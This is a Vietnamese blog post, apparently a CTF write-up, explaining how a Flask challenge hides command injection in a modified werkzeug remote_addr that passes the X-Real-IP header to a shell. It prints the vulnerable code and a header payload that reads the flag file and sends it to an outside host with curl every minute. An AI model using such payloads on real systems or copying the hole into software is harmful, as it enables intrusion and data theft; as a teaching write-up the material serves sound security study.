@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hugo Theme  | Matesctf final 2 - IP Spoofing to RCE in flask</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css" />
+    <link rel="stylesheet" href="https://hungry-visvesvaraya-d246d6.netlify.com/css/blog.css" />
+    
+</head>
+<body>
+
+    
+    <nav class="navbar is-fixed-top" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/">Home</a>
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/about">About</a>
+        </div>
+    </nav>
+    
+
+    
+    <section class="hero is-info is-medium">
+        <div class="hero-body" style="background-image: url(https://hungry-visvesvaraya-d246d6.netlify.com/img/bg-blog.jpg);">
+            <div class="container has-text-centered">
+                <br>
+                <h1 class="title is-size-1">
+                    
+                        Matesctf final 2 - IP Spoofing to RCE in flask
+                    
+                </h1>
+                
+            </div>
+        </div>
+    </section>
+
+
+<div class="container">
+    <div class="section">
+    
+
+<div class="columns">
+    <div class="column is-9">
+        <div class="tile is-child box">
+            <div class="content">
+                
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/ex50.PNG"/> 
+</figure>
+
+
+<h2 id="exploit-source-resources-matesctf-ex50-tar">EXPLOIT - <a href="https://hungry-visvesvaraya-d246d6.netlify.com/resources/matesctf/ex50.tar">source</a></h2>
+
+<hr>
+
+<p>Sau khoảng thời gian dài nghiên cứu và nhờ sự gợi ý hết sức nhiệt tình từ tác giả tôi đã có thể exploit được lỗi được tác giả cho là khó phát hiện nhất. Chuẩn luôn, là rất khó phát hiện vì code lỗi ở tận trong lib của flask.</p>
+
+<p>Đầu tiên, khi truy cập vào trang đăng nhập tác giả có gợi ý cho mọi người biết là app có handle real ip của client. (Hình trên)
+Thế nên mình tìm kiếm trong source để tìm xem có vấn đề bảo mật gì có thể khai thác được không.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#66d9ef">try</span>:
+        data <span style="color:#f92672">=</span> Novel<span style="color:#f92672">.</span>find_one({<span style="color:#e6db74">&#34;page&#34;</span>:<span style="color:#ae81ff">1</span>})
+        lines <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#39;content&#39;</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, page<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, message<span style="color:#f92672">=</span>[], _id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+        <span style="color:#66d9ef">print</span> e
+    <span style="color:#66d9ef">if</span> session<span style="color:#f92672">.</span>has_key(<span style="color:#e6db74">&#39;usn&#39;</span>):
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>,_id<span style="color:#f92672">=</span>data[<span style="color:#e6db74">&#39;_id&#39;</span>],message<span style="color:#f92672">=</span>lines,page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>,ip<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>remote_addr)</code></pre></div>
+
+<p>Chính là chỗ này, tác giả đã lấy <code>remote_addr</code> để hiển thị ra trang chủ. Thêm nữa, <code>remote_addr</code> còn được insert vào database lúc tạo user, ngoài ra thì không được dùng để làm gì nữa.
+Có 2 vector tấn công mà mình có thể nghĩ đến đó là: nosql injection và xss</p>
+
+<p>Tuy nghiên, giả sử bị lỗi nosql injection thì tội gì phải inject vào trường ip mà không inject vào trường username, hay name. Mặc khác, query ở đây là câu lệnh insert nên có vẻ khó để khai thác. XSS lại càng không, vì mình không tìm thấy flag nào trong cookie của bot, nếu có session của bot thì cũng không lấy được flag. Thế là 2 vector này xem như bỏ.</p>
+
+<p>Mình có test thêm một số cách nữa, là thay đổi giá trị của trường <code>X-Forwarded-For</code> để fake ip. và kết quả là:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Truy cập từ localhost. Kết quả nhận được giá trị 127.0.0.1</span>
+✔ curl localhost:8080  
+&lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn waves-effect waves-light&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span>/&gt;
+
+<span style="color:#75715e"># Thay đổi request header bằng giá trị ngẫu nghiên. Kết quả bị lỗi</span>
+✔ curl localhost:8080 -H <span style="color:#e6db74">&#34;X-Forwarded-For: 1.2.3.4&#34;</span>
+<span style="color:#f92672">{</span>
+  <span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;code&#34;</span>: <span style="color:#ae81ff">500</span>, 
+    <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;fake ip&#34;</span>
+  <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Thay đổi giá trị request header là ip thật. Kết quả trả về đúng với những gì gửi lên</span>
+✔ curl localhost:8080 -H <span style="color:#e6db74">&#34;X-Forwarded-For: 103.92.28.200&#34;</span> 
+&lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn waves-effect waves-light&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;103.92.28.200&#34;</span>/&gt;
+
+<span style="color:#75715e"># Truy cập từ internet. Kết quả nhận được là ip thật của client</span>
+✔ curl <span style="color:#ae81ff">103</span>.92.28.200
+&lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn waves-effect waves-light&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;58.187.170.100&#34;</span>/&gt;
+
+<span style="color:#75715e"># Thay đổi request header bằng giá trị 127.0.0.1. Kết quả không thay đổi</span>
+✔ curl <span style="color:#ae81ff">103</span>.92.28.200 -H <span style="color:#e6db74">&#34;X-Forwared-For: 127.0.0.1&#34;</span>
+&lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn waves-effect waves-light&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;58.187.170.100&#34;</span>/&gt;</code></pre></div>
+
+<p>Tại sao lại có sự khác biệt giữa internal và external? <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/oh.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/> Ở trung gian giữa 2 môi trường thì chỉ có reverse proxy tác động vào thôi. Kiểm tra cấu hình nginx tại <code>/etc/nginx/sites-enabled/default</code></p>
+
+<pre><code>server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+	server_name _;
+
+	location / {
+		proxy_set_header X-Forwarded-For $remote_addr;
+		proxy_pass http://127.0.0.1:8080/;
+	}
+}
+</code></pre>
+
+<p>Thì ra nginx đã set lại giá trị của X-Forwarded-For. Mình tìm kiếm thêm một số thông tin về cách khai thác theo hướng này. Có vẻ cách cấu hình của nginx và flask đều bị sai và có thể khai thác được lỗi này. Nhưng mình chưa hiểu vì sao mà không thực hiện ip spoofing được khi qua nginx. Nhưng đều đó không quan trọng, vì nếu attack được vector này thì làm sao get flag?</p>
+
+<ul>
+<li><a href="http://esd.io/blog/flask-apps-heroku-real-ip-spoofing.html">Flask apps on Heroku susceptible to IP spoofing</a></li>
+<li><a href="https://stackoverflow.com/questions/12770950/flask-request-remote-addr-is-wrong-on-webfaction-and-not-showing-real-user-ip">Nginx is more explicit</a></li>
+</ul>
+
+<p>Mình phải xin hint của tác giả, được gợi ý là tìm vị trí implement <code>request.remote_addr</code> trong lib. Thực hiện trace từ từ như bên dưới:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Để tìm được vị trí của thư viện flask ta có thể dùng lệnh đơn giản sau</span>
+✔ python -c <span style="color:#e6db74">&#34;import flask; print flask.__file__&#34;</span>
+/usr/local/lib/python2.7/dist-packages/flask/__init__.pyc
+
+<span style="color:#75715e"># Đối tượng request được gọi từ file globals.py</span>
+✔ cat /usr/local/lib/python2.7/dist-packages/flask/__init__.py | grep request
+from .globals import current_app, g, request
+
+<span style="color:#75715e"># Đối tượng request được khởi tạo từ method LocalProxy</span>
+✔ cat /usr/local/lib/python2.7/dist-packages/flask/globals.py | grep request 
+request <span style="color:#f92672">=</span> LocalProxy<span style="color:#f92672">(</span>partial<span style="color:#f92672">(</span>_lookup_req_object, <span style="color:#e6db74">&#39;request&#39;</span><span style="color:#f92672">))</span>
+
+<span style="color:#75715e"># Tìm vị trí của method LocalProxy, kết quả là tại werkzeug.local</span>
+✔ cat /usr/local/lib/python2.7/dist-packages/flask/globals.py | grep LocalProxy
+from werkzeug.local import LocalStack, LocalProxy
+
+<span style="color:#75715e"># Tìm vị trí của thư viện werkzeug</span>
+✔ python -c <span style="color:#e6db74">&#34;import werkzeug; print werkzeug.__file__&#34;</span>
+/usr/local/lib/python2.7/dist-packages/werkzeug/__init__.pyc 
+
+<span style="color:#75715e"># Đối tượng ta đang tìm kiếm được gán vào _LocalProxy__local và __wrapped__</span>
+✔ cat /usr/local/lib/python2.7/dist-packages/werkzeug/local.py
+class LocalProxy<span style="color:#f92672">(</span>object<span style="color:#f92672">)</span>:
+	def __init__<span style="color:#f92672">(</span>self, local, name<span style="color:#f92672">=</span>None<span style="color:#f92672">)</span>:
+	    object.__setattr__<span style="color:#f92672">(</span>self, <span style="color:#e6db74">&#39;_LocalProxy__local&#39;</span>, local<span style="color:#f92672">)</span>
+	    object.__setattr__<span style="color:#f92672">(</span>self, <span style="color:#e6db74">&#39;__name__&#39;</span>, name<span style="color:#f92672">)</span>
+	    <span style="color:#66d9ef">if</span> callable<span style="color:#f92672">(</span>local<span style="color:#f92672">)</span> and not hasattr<span style="color:#f92672">(</span>local, <span style="color:#e6db74">&#39;__release_local__&#39;</span><span style="color:#f92672">)</span>:
+	        object.__setattr__<span style="color:#f92672">(</span>self, <span style="color:#e6db74">&#39;__wrapped__&#39;</span>, local<span style="color:#f92672">)</span></code></pre></div>
+
+<p>Cũng hơi lòng vòng. Thực ra request được kết thừa từ class <code>BaseRequest</code> trong <code>wrappers.py</code>. Và remote_addr cũng được implement tại đây
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#a6e22e">@property</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote_addr</span>(self):
+    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>has_key(<span style="color:#e6db74">&#39;X-Real-IP&#39;</span>):
+        ip <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;X-Real-IP&#39;</span>)
+    <span style="color:#66d9ef">elif</span> self<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>has_key(<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>):
+        ip <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>)
+    <span style="color:#66d9ef">else</span>:
+        ip <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>)
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;netstat -tn | grep &#39;</span> <span style="color:#f92672">+</span> ip 
+    <span style="color:#f92672">import</span> subprocess
+    ps <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>STDOUT)
+    output <span style="color:#f92672">=</span> ps<span style="color:#f92672">.</span>communicate()[<span style="color:#ae81ff">0</span>]
+    <span style="color:#66d9ef">if</span> len(output) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>: 
+        <span style="color:#66d9ef">return</span> ip
+    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;fake ip&#34;</span>) </code></pre></div></p>
+
+<p>Đây rồi, command injection. <code>ip</code> có thể được custom từ trường <code>X-Real-IP</code> hoặc <code>X-Forwarded-For</code> và gọi <code>Popen</code>. Vì kết quả chỉ được hiển thị ra <code>ip</code> không phải <code>output</code> - dạng blind - nên cần phải bắt dữ liệu từ server khác. Mình viết script dùng curl gửi dữ liệu kèm theo flag, mỗi 1 phút sẽ tự động gửi flag qua 1 lần.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Script đọc flag mỗi 1 phút</span>
+✔ curl <span style="color:#ae81ff">103</span>.92.28.200 -H <span style="color:#e6db74">&#34;X-Real-IP: 127.0.0.1; while true; do curl 103.92.28.200:8000/?flag=`cat /home/ctf/ex50/flag`; sleep 60; done;&#34;</span>
+
+<span style="color:#75715e"># Bắt gói tin HTTP</span> 
+✔ php -S <span style="color:#ae81ff">103</span>.92.28.200:8000
+<span style="color:#f92672">[</span>Mon Sep <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span>:46:10 <span style="color:#ae81ff">2018</span><span style="color:#f92672">]</span> ::1:44454 <span style="color:#f92672">[</span><span style="color:#ae81ff">404</span><span style="color:#f92672">]</span>: /?flag<span style="color:#f92672">=</span>matesctf23w4324234234234234 - No such file or directory
+<span style="color:#f92672">[</span>Mon Sep <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span>:47:10 <span style="color:#ae81ff">2018</span><span style="color:#f92672">]</span> ::1:44456 <span style="color:#f92672">[</span><span style="color:#ae81ff">404</span><span style="color:#f92672">]</span>: /?flag<span style="color:#f92672">=</span>matesctf23w4324234234234234 - No such file or directory
+<span style="color:#f92672">[</span>Mon Sep <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span>:48:10 <span style="color:#ae81ff">2018</span><span style="color:#f92672">]</span> ::1:44458 <span style="color:#f92672">[</span><span style="color:#ae81ff">404</span><span style="color:#f92672">]</span>: /?flag<span style="color:#f92672">=</span>matesctf23w4324234234234234 - No such file or directory
+<span style="color:#f92672">[</span>Mon Sep <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span>:49:10 <span style="color:#ae81ff">2018</span><span style="color:#f92672">]</span> ::1:44460 <span style="color:#f92672">[</span><span style="color:#ae81ff">404</span><span style="color:#f92672">]</span>: /?flag<span style="color:#f92672">=</span>matesctf23w4324234234234234 - No such file or directory
+<span style="color:#f92672">[</span>Mon Sep <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span>:50:10 <span style="color:#ae81ff">2018</span><span style="color:#f92672">]</span> ::1:44462 <span style="color:#f92672">[</span><span style="color:#ae81ff">404</span><span style="color:#f92672">]</span>: /?flag<span style="color:#f92672">=</span>matesctf23w4324234234234234 - No such file or directory</code></pre></div>
+
+<h2 id="solutions">SOLUTIONS</h2>
+
+<hr>
+
+<p>To be continue &hellip;</p>
+
+            </div>
+        </div>
+    </div>
+    <div class="column is-3">
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Tags</h1>
+        <div class="tags">
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/ctf">ctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/cve">cve</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/flask">flask</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/laravel">laravel</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/matesctf">matesctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/php">php</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/python">python</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/serialization">serialization</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-2018">svattt-2018</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-final-2018">svattt-final-2018</a></span>
+        
+        </div>          
+    </div>
+</div><br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Recent posts</h1>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/new_year_2019/">New year 2019</a></h1>
+            <time class="has-text-grey-light is-size-7">1 January 2019</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/laravel-object-injection-to-rce/">Laravel object injection to RCE</a></h1>
+            <time class="has-text-grey-light is-size-7">25 October 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/php_object_injection_without_unserialize/">Php Object Injection Without Unserialize</a></h1>
+            <time class="has-text-grey-light is-size-7">20 September 2018</time>
+        
+    </div>
+</div>
+    <br>
+                
+  
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Related posts</h1>
+      
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf-final-2-brute-mongodb-_id/">Matesctf final 2 - Brute mongodb _id</a></h1>
+            <time class="has-text-grey-light is-size-7">13 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/meepwn_qual_round_web_pycalx_1/">Meepwn qual round - pycalx 1</a></h1>
+            <time class="has-text-grey-light is-size-7">11 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_ssti/">Matesctf final 2 - SSTI</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_xxe/">Matesctf final 2 - XXE Injection</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+    </div>
+</div>
+
+    
+<br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Archives</h1>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2019">2019</a> (1)<br>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2018">2018</a> (9)<br>
+        
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+</div>
+
+
+<script>
+
+
+
+
+var disqus_config = function () {
+this.page.url = "https:\/\/hungry-visvesvaraya-d246d6.netlify.com\/";  
+this.page.identifier = "blog-kev"; 
+};
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-kev.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<footer class="footer has-background-grey-darker has-text-white">
+    <div class="content has-text-centered">
+        <p>
+            <span class="icon is-large"><a href="https://twitter.com/" class="mysocial"><i class="fab fa-twitter fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://www.youtube.com/" class="mysocial"><i class="fab fa-youtube fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://github.com/" class="mysocial"><i class="fab fa-github fa-3x"></i></a></span>&nbsp;&nbsp;
+            <br><br>
+            Copyright &copy; Hugo Theme 2019</a>
+        </p>
+    </div>
+</footer>
+
+<script defer src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
+
+<script id="dsq-count-scr" src="//blog-kev.disqus.com/count.js" async></script>
+</body>
+</html>
